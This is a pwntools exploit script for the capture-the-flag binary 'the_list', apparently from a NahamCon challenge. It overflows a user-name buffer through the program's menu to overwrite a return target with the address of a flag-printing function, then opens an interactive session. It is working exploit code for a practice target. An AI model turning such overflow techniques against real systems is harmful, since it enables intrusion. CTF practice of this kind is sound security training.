#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 31980 ./the_list
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./the_list')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 31980)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x40196a
# b *0x401495
b *0x40170e
b *0x000000000040161d
b *0x000000000040184c
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def add_user(name):
    io.sendlineafter("> ","2")
    io.sendlineafter("name: ",name)

def change_user(no_user,name):
    io.sendlineafter("> ","4")
    io.sendlineafter("change? ", str(no_user))
    io.sendlineafter("name? ",name)

def del_user(no_user):
    io.sendlineafter("> ","3")
    io.sendlineafter("delete? ",str(no_user))

flag = 0x401369
p = "\x00"*31
io.sendlineafter("name: ",p)

for i in range(20):
    p = chr(ord('a')+i)*8
    add_user(p)

p = 'a'*8
p += p64(flag)
change_user(19,p)

io.sendlineafter("> ","5")


io.interactive()
